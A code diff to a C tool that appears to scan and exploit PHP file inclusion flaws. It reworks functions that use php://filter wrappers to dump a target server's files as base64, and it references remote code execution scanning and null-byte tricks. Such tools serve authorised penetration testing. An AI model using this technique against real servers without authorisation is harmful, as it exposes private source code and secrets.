@@ -6,6 +6,7 @@
 #include "string/concat.h"
 #include "string/utils.h"
 #include "string/url.h"
+#include "explotation/php-filter.h"
 
 char *build_datawrap(const char *phpcode){
     char *ret, *b64, *b64safe;
@@ -403,49 +404,36 @@ int rce_scan(url_t *url, int pos){
     return 0;
 }
 
-void source_disclosure_get(const char *url, const char *filename, const char *pname, FILE *out){
-    struct request body1, body2;
-    char *urlfilter, *filter, *content_diff, *decoded;
+// (int pos) instead of pname
+void phpfilter_dumpfile(FILE *out, const char *target, const char *filename, const char *pname){
+    char *b64, *decoded;
+    url_t url;
+
+    int i, pos = -1;
     size_t len;
 
-    xmalloc(filter, strlen(filename)+sizeof(FILTER_WRAP));
-    memcpy(filter, FILTER_WRAP, sizeof(FILTER_WRAP));
-    strcat(filter, filename);
-
-    urlfilter = build_url_simple(url, pname, filter, replace_string);
-    free(filter);
-
-    if(!urlfilter){
-        xerror("parameter %s not found !!!\n", pname);
-        return;
+    urlparser(&url, target);
+    for(i = 0; i < url.plen; i++){
+        if(!strcmp(url.parameters[i].key, pname)){
+            pos = i;
+            break;
+        }
     }
 
-    CURL *ch1 = init_curl(&body1);
-    CURL *ch2 = init_curl(&body2);
-
-    init_str(&body1);
-    init_str(&body2);
-
-    curl_easy_setopt(ch1, CURLOPT_URL, url);
-    curl_easy_setopt(ch2, CURLOPT_URL, urlfilter);
-    free(urlfilter);
+    if(pos == -1){
+        xerror("parameter %s not found !!!\n", pname);
+        goto end;
+    }
 
     xinfo("trying get source code of file: %s\n", filename);
 
-    if(!http_request(ch1) || !http_request(ch2))
-        goto end;
-
-    content_diff = diff(body1.ptr, body2.ptr);
-
-    if(!content_diff){
-        xerror("cannot detect base64 output\n");
+    if((b64 = phpfilter(&url, target, filename, pos)) == NULL){
         goto end;
     }
 
-    trim(&content_diff);
-
-    if((decoded = b64decode(content_diff, &len))){
+    if((decoded = b64decode(b64, &len))){
         xgood("valid base64 returned:\n");
+
         if(out){
             fwrite(decoded, len, 1, out);
             fclose(out);
@@ -453,6 +441,7 @@ void source_disclosure_get(const char *url, const char *filename, const char *pn
         } else {
             fwrite(decoded, len, 1, stdout);
         }
+
         printf("\n");
         free(decoded);
     } else {
@@ -460,13 +449,10 @@ void source_disclosure_get(const char *url, const char *filename, const char *pn
         xinfo("try use null byte poison, or set filename without extension\n");
     }
 
-    free(content_diff);
+    free(b64);
 
     end:
-    curl_easy_cleanup(ch1);
-    curl_easy_cleanup(ch2);
-    free(body1.ptr);
-    free(body2.ptr);
+    urlfree(&url);
 }
 
 int check_files(url_t *url, int pos){
@@ -689,55 +675,36 @@ int common_error_check(const char *uri){
     return result;
 }
 
-int disclosure_check(const char *uri, const char *xuri){
-    struct request body1, body2;
-    char *decoded;
+int phpfilter_scan(url_t *url, const char *oldurl, int pos){
+    char *b64, *decoded;
+
+    int success = 0;
     size_t len;
-    char *b64 = NULL;
-    int result = 0;
 
-    CURL *ch1 = init_curl(&body1);
-    CURL *ch2 = init_curl(&body2);
+    b64 = phpfilter(url, oldurl, url->parameters[pos].value, pos);
 
-    init_str(&body1);
-    init_str(&body2);
+    if(!b64){
+        return 0;
+    }
 
-    curl_easy_setopt(ch1, CURLOPT_URL, uri);
-    curl_easy_setopt(ch2, CURLOPT_URL, xuri);
-
-    if(!http_request(ch1) || !http_request(ch2)){
-        result = -1;
+    if(thread_enable){
+        success = isb64valid(b64, strlen(b64));
         goto end;
     }
 
-    b64 = diff(body1.ptr, body2.ptr);
-
-    if(!b64)
-        goto end;
-
-    trim(&b64);
-
     if((decoded = b64decode(b64, &len))){
-        result = 1;
+        success = 1;
 
-        if(!thread_enable){
-            good("target probably vulnerable, hexdump: \n\n");
-            hexdump(decoded, len, 0);
-            print_all("\n");
-        }
+        good("target probably vulnerable, hexdump: \n\n");
+        hexdump(decoded, len, 0);
+        print_all("\n");
 
         free(decoded);
     }
 
-    free(b64);
-
     end:
-        curl_easy_cleanup(ch1);
-        curl_easy_cleanup(ch2);
-        free(body1.ptr);
-        free(body2.ptr);
-
-    return result;
+    free(b64);
+    return success;
 }
 
 void scan(const char *target){
@@ -809,8 +776,7 @@ void scan(const char *target){
         if(!dynamic){
             info("starting source disclosure test ...\n");
 
-            targeturl = buildurl(&url, string_prepend, FILTER_WRAP, i);
-            result = disclosure_check(target, targeturl);
+            result = phpfilter_scan(&url, target, i);
 
             if(result == -1){
                 goto end;
@@ -950,15 +916,10 @@ void *thread_scan(void *param){
         }
 
         if(!dynamic){
-            targeturl = buildurl(&url, string_prepend, FILTER_WRAP, i);
-            result = disclosure_check(target, targeturl);
+            result = phpfilter_scan(&url, target, i);
 
-            //if(result == -1)
-            //    goto end;
             if(result == 1)
-                print_thread("[RSD] %s | %s\n", targeturl, parameter->key);
-
-            xfree(targeturl);
+                print_thread("[RSD] %s | %s\n", target, parameter->key);
 
         }
 
